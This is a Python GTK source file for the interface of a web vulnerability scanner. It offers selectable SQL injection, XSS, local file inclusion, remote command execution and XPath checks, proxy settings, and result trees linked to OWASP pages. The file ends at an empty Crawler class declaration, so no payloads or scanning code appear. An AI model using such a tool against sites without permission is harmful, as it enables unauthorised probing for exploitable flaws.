#!/usr/bin/python
# coding=utf-8

"""
                    if you running python3.xx pymysql uncomment pymysql module for importing 
                    Then uncomment the line the line 87
//>>>>>>>>>>> else
                    if you use python2.7 comment pymysql and uncomment MySQLdb module
                    Then uncomment the line the line 85

"""

import requests,time,re,subprocess,gi
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, Gdk, GObject



class SearchDialog(Gtk.Dialog):

  def __init__(self, parent):
      Gtk.Dialog.__init__(self, "Something", parent,
          Gtk.DialogFlags.MODAL, buttons=(
          Gtk.STOCK_NEW, Gtk.ResponseType.OK,
          Gtk.STOCK_CANCEL, Gtk.ResponseType.CANCEL))

      self.set_default_size(400, 600)

      box = self.get_content_area()

      label = Gtk.Label("Insert text you want to search for:")
      box.add(label)

#        self.entry = Gtk.Entry()
#        box.add(self.entry)

      self.main_area = Gtk.Stack()
      self.main_area.set_transition_type(Gtk.StackTransitionType.SLIDE_LEFT_RIGHT)

      self.main_area.set_transition_duration(1000)

      self.entry = Gtk.Entry()
      self.main_area.add_titled(self.entry, "entry_name", "Entry Url")

      self.labelS = Gtk.Label()
      self.label_txt = """<big><i>you have choice to runn the scan directly or after setup the scanning process you want to follow on your target</i></big>"""
      self.labelS.set_markup(self.label_txt)
      self.labelS.set_line_wrap(True)
      self.main_area.add_titled(self.labelS, "label_name", "How Scan will Start")

      self.our_stackSwitcher = Gtk.StackSwitcher()
      self.our_stackSwitcher.set_stack(self.main_area)

      box.add(self.our_stackSwitcher)
      box.add(self.main_area)

      self.show_all()


#~~~~~~~~~~~~ History Dialog ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
class HistoryDialog(Gtk.Dialog):

  def __init__(self, parent):
      Gtk.Dialog.__init__(self, "History Scanne Tables", parent,
          Gtk.DialogFlags.MODAL, buttons=(
          Gtk.STOCK_OK, Gtk.ResponseType.OK,
          Gtk.STOCK_CANCEL, Gtk.ResponseType.CANCEL))

      self.set_default_size(500, 400)

      box = self.get_content_area()

      self.HoriBox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
      box.add(self.HoriBox)

      self.scrolledwindow = Gtk.ScrolledWindow()
      self.scrolledwindow.set_hexpand(True)
      self.scrolledwindow.set_vexpand(True)

      self.HoriBox.pack_start(self.scrolledwindow, True, True, 0)

      self.people_lst = []
      
      #convert data to listStore Now (lists that TreeView can Display)
      peoples_list_store = Gtk.ListStore(str, str, str, str)
      for item in self.people_lst:
        peoples_list_store.append(list(item))
      #Make treeView for those item will display
      people_tree_view = Gtk.TreeView(peoples_list_store)

      for i, col_title in enumerate(["Website", "Point", "Faille","Payload"]):
        #Render means how to draw the data
        renderer = Gtk.CellRendererText()
        #create columns
        column = Gtk.TreeViewColumn(col_title, renderer, text=i)
        column.set_sort_column_id(i) # Make the Columns Sortable just bech ywali bsort (option)
        people_tree_view.append_column(column) # Add column to treeView

      #Handel data
      selected_row = people_tree_view.get_selection()
      selected_row.connect("changed", self.the_item_selected)

      # Add TreeView to main layout now
      self.scrolledwindow.add(people_tree_view)
      self.show_all()

  #user selectred row method
  def the_item_selected(self, selection):
    model, row = selection.get_selected()
    if row is not None:
        model[row][0]
        model[row][1]
        model[row][2]
        model[row][3]      
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#


class MyWindow(Gtk.Window):

    def __init__(self):
        Gtk.Window.__init__(self, title="Vulnerability Scanner Version 1.0")

        self.set_default_size(1150, 300)
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.add(vbox)
        Hbox1 = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        vbox.add(Hbox1)
        Hbox2 = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        vbox.add(Hbox2)
        Hbox3 = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        vbox.add(Hbox3)

        main_menu_bar = Gtk.MenuBar()
#################################################################################
        #drop down the menu
        file_menu1 = Gtk.Menu()
        file_menu1_dropdown = Gtk.MenuItem("File")

        #File menu Items
        file_new = Gtk.MenuItem("New Scan")
        file_save = Gtk.MenuItem("Display History")
        file_exit = Gtk.MenuItem("Exit")

        file_menu1_dropdown.set_submenu(file_menu1)
        file_menu1.append(file_new)
        file_new.connect("activate", self.Onclick_new)
        file_menu1.append(file_save)
        file_save.connect("activate", self.Onclick_save)
        file_menu1.append(Gtk.SeparatorMenuItem())
        file_menu1.append(file_exit)
        file_exit.connect("activate",self.Onclick_exit)

        #add the menu to the main menu bar
        main_menu_bar.append(file_menu1_dropdown)
###################################################################################
        #drop down the menu
        file_menu2 = Gtk.Menu()
        file_menu2_dropdown = Gtk.MenuItem("Scan")

        #File menu Items
        file_Save = Gtk.MenuItem("Save")
        file_cancel = Gtk.MenuItem("Cancel")

        file_menu2_dropdown.set_submenu(file_menu2)
        file_menu2.append(file_Save)
        file_Save.connect("activate", self.Onclick_Save)
        file_menu2.append(file_cancel)
        file_cancel.connect("activate", self.Onclick_cancel)


        #add the menu to the main menu bar
        main_menu_bar.append(file_menu2_dropdown)
###################################################################################
        #drop down the menu
        file_menu3 = Gtk.Menu()
        file_menu3_dropdown = Gtk.MenuItem("Help")

        #File menu Items
        file_mode = Gtk.MenuItem("Mode")
        file_about = Gtk.MenuItem("About")

        file_menu3_dropdown.set_submenu(file_menu3)
        file_menu3.append(file_mode)
        file_mode.connect("activate", self.Onclick_mode)
        file_menu3.append(file_about)
        file_about.connect("activate", self.Onclick_about)


        #add the menu to the main menu bar
        main_menu_bar.append(file_menu3_dropdown)
###################################################################################
        ## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ##
        Hbox1.pack_start(main_menu_bar , True, True, 0)

        self.links_are = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        Hbox3.pack_start(self.links_are, True, True, 0)
        self.notebook2 = Gtk.Notebook(vexpand=True)
        Hbox3.pack_start(self.notebook2, True, True, 0)
##################################################################################################
        self.Note_book_external_links = Gtk.Notebook(vexpand=True)
        self.links_are.pack_start(self.Note_book_external_links , True, True, 0)

        self.Note_book_tree_result = Gtk.Notebook(vexpand=True)
        self.links_are.pack_start(self.Note_book_tree_result, True, True, 0)

###################################################################################################
        self.Notebook_Result_page1 = Gtk.Box()

        self.notebook2.append_page(self.Notebook_Result_page1, Gtk.Label('Main Area'))

        self.Notebook_Result_page2 = Gtk.Box()
        self.notebook2.append_page(self.Notebook_Result_page2, Gtk.Label('Configuration Area'))
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ NoteBook_external link Page ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
####################### give self.Notebook_Result_page1 Two row ###################################
        Veritcal1_of_pan2_page1 = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=20)
        self.Notebook_Result_page1.add(Veritcal1_of_pan2_page1)

        H1_of_vertical = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        Veritcal1_of_pan2_page1.add(H1_of_vertical)

        H2_of_vertical = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        Veritcal1_of_pan2_page1.add(H2_of_vertical)

        v1 = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing = 15)
        H2_of_vertical.add(v1)

        self.label_logo = Gtk.Image()
        self.label_logo.set_from_file('logog.png')
        H1_of_vertical.pack_start(self.label_logo, True, True, 0)

        
        self.label_selected_point = "http://vulnerable.site.com/pointInfected"

        self.table_result_show = Gtk.Table(4, 4, True)
        self.table_result_show.set_hexpand(True)
        self.table_result_show.set_vexpand(True)
        self.table_result_show.set_border_width(10)

        self.label_result_show = Gtk.Label()
        self.label_result_show.set_size_request(24, 24)
        self.label_result_show.set_markup("""<a href=\""""+self.label_selected_point+""""title=\"Infected Links\">"""+self.label_selected_point+"""</a>""")
        self.label_result_show.set_line_wrap(True)
        self.table_result_show.attach(self.label_result_show, 0, 4, 0, 1)


        scrolledwindow = Gtk.ScrolledWindow()
        scrolledwindow.set_hexpand(True)
        scrolledwindow.set_vexpand(True)
        self.table_result_show.attach(scrolledwindow, 0, 4, 1, 4)

        self.textview = Gtk.TextView()
        self.textbuffer = self.textview.get_buffer()
#        self.textbuffer.set_text("This is som\ne text \ninside of a Gtk.T\nextView. "
#            + "Sel\nect\n text and click one of t\nhe buttons 'bold\n', 'italic', "
#            + "or '\nunderline' to modify t\nhe text accordingly.\n")
        scrolledwindow.add(self.textview)
        self.textview.set_editable(False)

        self.textview.override_background_color(Gtk.StateFlags.NORMAL, Gdk.RGBA(255, 253, 255, 0.3))

        v1.pack_start(self.table_result_show, True, True, 0)        
###################################################################################################
####### ~~~~~~~~~~~~~~~~~~~~~ Proxy parameters and mode of scanne area~~~~~~~~~~~~~~~~~~~~~ #######
        vertical_box_parameters = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=20)
        self.Notebook_Result_page2.add(vertical_box_parameters)

        piece_of_center = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        vertical_box_parameters.add(piece_of_center)

        table = Gtk.Table(6, 4, True,vexpand=True,hexpand=True)
        table.set_border_width(20)

        self.label_configuration = Gtk.Label("Configuration")
        self.label_vul_type = Gtk.Label("Setup Vulnerability")
        self.label_prxy_general = Gtk.Label("Setup Proxy")

        self.Valide_Sql_Get = Gtk.CheckButton("SQL Get Verify")
        self.Valide_Sql_Get.connect("toggled", self.on_sqlget_toggled)

        self.Valide_xss_Get = Gtk.CheckButton("XSS Get Verify")
        self.Valide_xss_Get.connect("toggled", self.on_xssget_toggled)

        self.Valide_lfi = Gtk.CheckButton("LFI Verify")
        self.Valide_lfi.connect("toggled", self.on_lfi_toggled)

        self.Valide_rce = Gtk.CheckButton("RCE Get Verify")
        self.Valide_rce.connect("toggled", self.on_rce_toggled)

#        self.Valide_xpath = Gtk.CheckButton("XPATH Get Verify")
#        self.Valide_xpath.connect("toggled", self.on_xpath_toggled)

        self.Valide_Sql_Post = Gtk.CheckButton("SQL Post Verify")
        self.Valide_Sql_Post.connect("toggled", self.on_sqlpost_toggled)

        self.Valide_xss_Post = Gtk.CheckButton("XSS Post Verify")
        self.Valide_xss_Post.connect("toggled", self.on_xsspost_toggled)

        self.label_host = Gtk.Label("Set Your proxy")
        self.input_prxy = Gtk.Entry()
        self.label_host_port = Gtk.Label("Set your proxy port")
        self.input_prxy_port = Gtk.Entry()
#        self.btn = Gtk.Button(label="Submit")

        #{{{{{{{{{{{{ table xpath }}}}}}}}}}}}
        self.table2 = Gtk.Table(2, 4, True,vexpand=True,hexpand=True)

        self.Valide_xpath = Gtk.CheckButton("XPATH Get Verify")
        self.Valide_xpath.connect("toggled", self.on_xpath_toggled)

        self.table2.attach(self.Valide_xpath, 1, 3, 0, 1)
        #{{{{{{{{{{{{             }}}}}}}}}}}}
        #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
        #{{{{{{{{{{{{ table button }}}}}}}}}}}}
        self.table3 = Gtk.Table(3, 3, True,vexpand=True,hexpand=True)
        self.btn = Gtk.Button(label="Submit")
        self.btn.connect("clicked", self.btn_clicked)
        self.table3.attach(self.btn, 1, 2, 1, 2)
        #{{{{{{{{{{{{             }}}}}}}}}}}}

        table.attach(self.label_configuration, 0, 4, 0, 1)
        table.attach(self.label_vul_type, 0, 2, 1, 2)
        table.attach(self.label_prxy_general, 2, 4, 1, 2)
        table.attach(self.Valide_Sql_Get, 0, 1, 2, 3)
        table.attach(self.Valide_Sql_Post, 1, 2, 2, 3)
        table.attach(self.Valide_xss_Get, 0, 1, 3, 4)
        table.attach(self.Valide_xss_Post, 1, 2, 3, 4)
        table.attach(self.Valide_lfi, 0, 1, 4, 5)
        table.attach(self.Valide_rce, 1, 2, 4, 5)
        table.attach(self.table2, 0, 2, 5, 6)
        table.attach(self.label_host, 2, 3, 3, 4)
        table.attach(self.input_prxy, 3, 4, 3, 4)
        table.attach(self.label_host_port, 2, 3, 4, 5)
        table.attach(self.input_prxy_port, 3, 4, 4, 5)
        table.attach(self.table3, 2, 4, 5, 6)
        
        piece_of_center.pack_start(table, True, True, 0)

        #[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]

        #[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
################################################~~~~~~~~~##########################################
        self.Notebook_external_Links_page = Gtk.Box()

        self.Note_book_external_links.append_page(self.Notebook_external_Links_page, Gtk.Label('External Links'))
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ NoteBook_tree store Page ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
        self.Notebook_TreeStore_page = Gtk.Box()

        self.Note_book_tree_result.append_page(self.Notebook_TreeStore_page, Gtk.Label('Vulnerabilties'))
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Add a tree Store area ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
        self.mylist_get_sql = []
        self.mydic_lfi = {}
        self.mydic_get_xss = {}
        self.mydic_xpath = {}
        self.mylist_rce = []
        self.mylist_post_sql = []
        self.mydic_post_xss = {}

        self.scrolledwindow = Gtk.ScrolledWindow()
        self.scrolledwindow.set_hexpand(True)
        self.scrolledwindow.set_vexpand(True)
        self.Notebook_TreeStore_page.add(self.scrolledwindow)

        self.treestore = Gtk.TreeStore(str)
        self.List_sql_Get = self.treestore.append(None, ["SQL Injection Get"])
        self.List_xss_Get = self.treestore.append(None, ["Cross site Scripting Get"])
        self.List_xpath = self.treestore.append(None, ["Xpath Injection"])
        self.List_lfi = self.treestore.append(None, ["Local File Include"])
        self.List_rce = self.treestore.append(None, ["Remote Command Execute"])
        self.List_sql_post = self.treestore.append(None, ["SQL Injection Post"])
        self.List_xss_post = self.treestore.append(None, ["Cross site Scripting Post"])


        self.treeview = Gtk.TreeView()
        self.treeview.set_model(self.treestore)
        self.scrolledwindow.add(self.treeview)

        self.cellrenderertext = Gtk.CellRendererText()

        self.treeviewcolumn = Gtk.TreeViewColumn("")
        self.treeview.append_column(self.treeviewcolumn)
        self.treeviewcolumn.pack_start(self.cellrenderertext, True)
        self.treeviewcolumn.add_attribute(self.cellrenderertext, "text", 0)


#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Add a External Link area ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
        self.mylist = []

        self.scrolledwindow_EL = Gtk.ScrolledWindow()
        self.scrolledwindow_EL.set_hexpand(True)
        self.scrolledwindow_EL.set_vexpand(True)
        self.Notebook_external_Links_page.add(self.scrolledwindow_EL)
 
        self.treestore_EL = Gtk.TreeStore(str)
        self.tree_name = "Extrenal Links"
        self.ListOne_EL = self.treestore_EL.append(None, [self.tree_name])
 
 
        self.treeview_EL = Gtk.TreeView()
        self.treeview_EL.set_model(self.treestore_EL)
        self.scrolledwindow_EL.add(self.treeview_EL)
 
        self.cellrenderertext_EL = Gtk.CellRendererText()
 
        self.treeviewcolumn_EL = Gtk.TreeViewColumn("")
        self.treeview_EL.append_column(self.treeviewcolumn_EL)
        self.treeviewcolumn_EL.pack_start(self.cellrenderertext_EL, True)
        self.treeviewcolumn_EL.add_attribute(self.cellrenderertext_EL, "text", 0)
 
#        for listItem in self.mylist:
#            self.treestore_EL.append(self.ListOne_EL, [listItem])

#        select2 = self.treeview_EL.get_selection()

#        def opt(selection):
#            model, treeiter = selection.get_selected()
#            if treeiter != None:
#                a = model[treeiter][0]
#                if a.find(' ') == -1:
#                    print(a)
 
       
#        select2.connect("changed", opt)

        self.condition_sql_get = "Ready"
        self.condition_sql_post = "Ready"
        self.condition_xss_get = "Ready"
        self.condition_xss_post = "Ready"
        self.condition_lfi = "Ready"
        self.condition_rce = "Ready"
        self.condition_xpath = "Ready"
        self.condition_proxy_chain = None
        self.condition_proxy_port = None
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
    def Onclick_new(self, widget):
        dialog = SearchDialog(self)
        response = dialog.run()
        if response == Gtk.ResponseType.OK:
            passing_url_get = dialog.entry.get_text()
            if(("http" in passing_url_get) or ("https" in passing_url_get)):
              pass
            else:
              passing_url_get = "http://"+passing_url_get
            self.textbuffer.set_text("Scanne is start")
            self.target = dialog.entry.get_text()
            self.tree_name = self.target
            self.treestore_EL.clear()
            self.treestore.clear()

            self.ListOne = self.treestore_EL.append(None, [self.tree_name])
            self.treeview_EL.set_model(self.treestore_EL)

            self.List_sql_Get = self.treestore.append(None, ["SQL Injection Get"])
            self.List_xss_Get = self.treestore.append(None, ["Cross site Scripting Get"])
            self.List_xpath = self.treestore.append(None, ["Xpath Injection"])
            self.List_lfi = self.treestore.append(None, ["Local File Include"])
            self.List_rce = self.treestore.append(None, ["Remote Command Execute"])
            self.List_sql_post = self.treestore.append(None, ["SQL Injection Post"])
            self.List_xss_post = self.treestore.append(None, ["Cross site Scripting Post"])
            self.n_list = self.treestore.append(None, None)
            self.treeview.set_model(self.treestore)

                    
            dialog.destroy()

            while Gtk.events_pending():
                Gtk.main_iteration_do(False)


            passing_url = Crawler(passing_url_get,self.condition_sql_get,self.condition_sql_post,self.condition_xss_get,self.condition_xss_post,self.condition_lfi,self.condition_rce,self.condition_xpath,self.condition_proxy_chain,self.condition_proxy_port)
            passing_url.intensive_crawle()


            self.mylist_get_sql = passing_url.out_sqlget
            self.mydic_lfi = passing_url.out_lfi
            self.mydic_get_xss = passing_url.out_xssGet
            self.mydic_xpath = passing_url.out_xpath
            self.mylist_rce = passing_url.out_rce
            self.mylist_post_sql = passing_url.out_sqlpost
            self.mydic_post_xss = passing_url.out_xssPost

            self.mylist = passing_url.lista

    #~~~~~~~~~~~~~~~~~~~~ [Vulnerabilities Store start] ~~~~~~~~~~~~~~~~~~~~~~~~~~//
            for listItem in self.mylist_get_sql:
                self.treestore.append(self.List_sql_Get, [listItem])

            for listItem in self.mydic_lfi:
                self.treestore.append(self.List_lfi, [listItem])

            for listItem in self.mydic_get_xss:
                self.treestore.append(self.List_xss_Get, [listItem])

            for listItem in self.mydic_xpath:
                self.treestore.append(self.List_xpath, [listItem])

            for listItem in self.mylist_rce:
                self.treestore.append(self.List_rce, [listItem])

            for listItem in self.mylist_post_sql:
                self.treestore.append(self.List_sql_post, [listItem])

            for listItem in self.mydic_post_xss:
                self.treestore.append(self.List_xss_post, [listItem])

            select1 = self.treeview.get_selection()
                   
             
            def opt(selection):
                model1 = None
                treeiter1 = None
                model1, treeiter1 = selection.get_selected()
                if treeiter1 != None:
                    a1 = ""
                    a1 = model1[treeiter1][0]
                    if a1.find(' ') == -1:
                        testedby = ""
                        if("&" in a1):
                          a1 = a1.replace("&","&amp;")
                        
                        self.label_result_show.set_markup("""<a href=\""""+a1+""""title=\"Infected Links\">"""+a1+"""</a>""")
                        if(a1 in self.mylist_get_sql):
                          self.textbuffer.set_text("SQL Get in this point, see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/SQL_injection")

                        if(a1 in self.mydic_lfi):
                          testedby = self.mydic_lfi[a1]
                          self.textbuffer.set_text("Local file inclusion in this point tested by this pay"+testedby+" see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion")
                        
                        if(a1 in self.mydic_get_xss):
                          testedby = self.mydic_get_xss[a1]
                          self.textbuffer.set_text("Get xss in this point tested by this pay"+testedby+" see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)")
                        
                        if(a1 in self.mydic_xpath):
                          testedby = self.mydic_xpath[a1]
                          self.textbuffer.set_text("Xpath injection in this point tested by this pay"+testedby+" see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/XPATH_Injection")
                        
                        if(a1 in self.mylist_rce):
                          self.textbuffer.set_text("Remote command execution in this point see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/Code_Injection")
                        
                        if(a1 in self.mylist_post_sql):
                          self.textbuffer.set_text("Post SQLI in this point see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)")
                        
                        if(a1 in self.mydic_post_xss):
                          testedby = self.mydic_post_xss[a1]
                          self.textbuffer.set_text("Post xss in this point tested by this pay"+testedby+" see more about the vulnerability by folowing Owasp link : https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)")
                   
            select1.connect("changed", opt)

    #~~~~~~~~~~~~~~~~~~~~~~ [Vulnerabilities Store End] ~~~~~~~~~~~~~~~~~~~~~~~~~~//
    #/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\#
    #~~~~~~~~~~~~~~~~~~~~ [External link start] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
            for listItem in self.mylist:
                self.treestore_EL.append(self.ListOne, [listItem])
                        

            select2 = self.treeview_EL.get_selection()

            def opt(selection):
                model = None
                treeiter = None
                model, treeiter = selection.get_selected()
                if treeiter != None:
                    a = ""
                    a = model[treeiter][0]
                    if a.find(' ') == -1:
                        if(a == self.tree_name):
                            pass
                        else:
                            print(a)
             
                   
            select2.connect("changed", opt)
    #~~~~~~~~~~~~~~~~~~~~~~ [External Links End] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
        else:
            dialog.destroy()

    def Onclick_save(self, widget):
        dialogh = HistoryDialog(self)
        response = dialogh.run()
        if response == Gtk.ResponseType.OK:
            dialogh.destroy()
        else:
            dialogh.destroy()

    def Onclick_exit(self, widget):
        print("exit clicked")
        Gtk.main_quit()
    def Onclick_Save(self, widget):
      save_status = Crawler(None,None,None,None,None,None,None,None,None,None)
      save_status.save_scan()
    def Onclick_cancel(self, widget):
        print("Cancel clicked")
    def Onclick_mode(self, widget):
        print("Mode of use clicked")
    def Onclick_about(self, widget):
        print("About clicked")
        ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
    Get_sql_mode= None
    Post_sql_mode = None
    Get_xss_mode = None
    Post_xss_mode = None
    Lfi_mode = None
    Rce_mode = None
    Xpath_mode = None

    def on_sqlget_toggled(self, button):
        if button.get_active():
            self.Get_sql_mode = "Active"
        else:
            self.Get_sql_mode= None

    def on_sqlpost_toggled(self, button):
        if button.get_active():
            self.Post_sql_mode = "Active"
        else:
            self.Post_sql_mode= None

    def on_xssget_toggled(self, button):
        if button.get_active():
            self.Get_xss_mode = "Active"
        else:
            self.Get_xss_mode= None

    def on_xsspost_toggled(self, button):
        if button.get_active():
            self.Post_xss_mode = "Active"
        else:
            self.Post_xss_mode= None

    def on_lfi_toggled(self, button):
        if button.get_active():
            self.Lfi_mode = "Active"
        else:
            self.Lfi_mode= None

    def on_rce_toggled(self, button):
        if button.get_active():
            self.Rce_mode = "Active"
        else:
            self.Rce_mode= None

    def on_xpath_toggled(self, button):
        if button.get_active():
            self.Xpath_mode = "Active"
        else:
            self.Xpath_mode= None


    def btn_clicked(self,widget):

        self.condition_proxy_port = None
        self.condition_sql_get = None
        self.condition_sql_post = None
        self.condition_xss_get = None
        self.condition_xss_post = None
        self.condition_lfi = None
        self.condition_rce = None
        self.condition_xpath = None
        self.condition_proxy_chain = None

        if not self.Get_sql_mode and not self.Post_sql_mode and not self.Get_xss_mode and not self.Post_xss_mode and not self.Lfi_mode and not self.Rce_mode and not self.Xpath_mode:
            if (self.input_prxy.get_text() == "") and (self.input_prxy_port.get_text() == ""):
                print("we going to scanne all vulnerability types without using Proxies")

                self.condition_proxy_port = "Ready"
                self.condition_sql_get = "Ready"
                self.condition_sql_post = "Ready"
                self.condition_xss_get = "Ready"
                self.condition_xss_post = "Ready"
                self.condition_lfi = "Ready"
                self.condition_rce = "Ready"
                self.condition_xpath = "Ready"
                self.condition_proxy_chain = "Ready"

        else:
            if self.Get_sql_mode:
                if(self.Get_sql_mode == "Active"):
                    self.condition_sql_get ="Ready"
#                    print(self.condition_sql_get)
                else:
                    pass

            if self.Post_sql_mode:
                if self.Post_sql_mode:
                    if(self.Post_sql_mode == "Active"):
                        self.condition_sql_post ="Ready"
#                        print(self.condition_sql_post)
                    else:
                        pass

            if self.Get_xss_mode:
                if self.Get_xss_mode:
                    if(self.Get_xss_mode == "Active"):
                        self.condition_xss_get ="Ready"
#                        print(self.condition_xss_get)
                    else:
                        pass

            if self.Post_xss_mode:
                if self.Post_xss_mode:
                    if(self.Post_xss_mode == "Active"):
                        self.condition_xss_post ="Ready"
#                        print(self.condition_xss_post)
                    else:
                        pass

            if self.Lfi_mode:
                if self.Lfi_mode:
                    if(self.Lfi_mode == "Active"):
                        self.condition_lfi = "Ready"
#                        print(self.condition_lfi)
                    else:
                        pass

            if self.Rce_mode:
                if self.Rce_mode:
                    if(self.Rce_mode == "Active"):
                        self.condition_rce = "Ready"
#                        print(self.condition_rce)
                    else:
                        pass

            if self.Xpath_mode:
                if self.Xpath_mode:
                    if(self.Xpath_mode == "Active"):
                        self.condition_xpath = "Ready"
#                        print(self.condition_xpath)
                    else:
                        pass

        if (self.input_prxy.get_text() != "") and (self.input_prxy_port.get_text() != ""):
            self.condition_proxy_chain = self.input_prxy.get_text()
            self.condition_proxy_port = self.input_prxy_port.get_text()
            print("the proxy is %s and the port is %s"%(self.condition_proxy_chain,self.condition_proxy_port))

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#    condition_sql_get = None
#    condition_sql_post = None
#    condition_xss_get = None
#    condition_xss_post = None
#    condition_lfi = None
#    condition_rce = None
#    condition_xpath = None
#    condition_proxy_chain = None
#    condition_proxy_port = None

class Crawler(object):
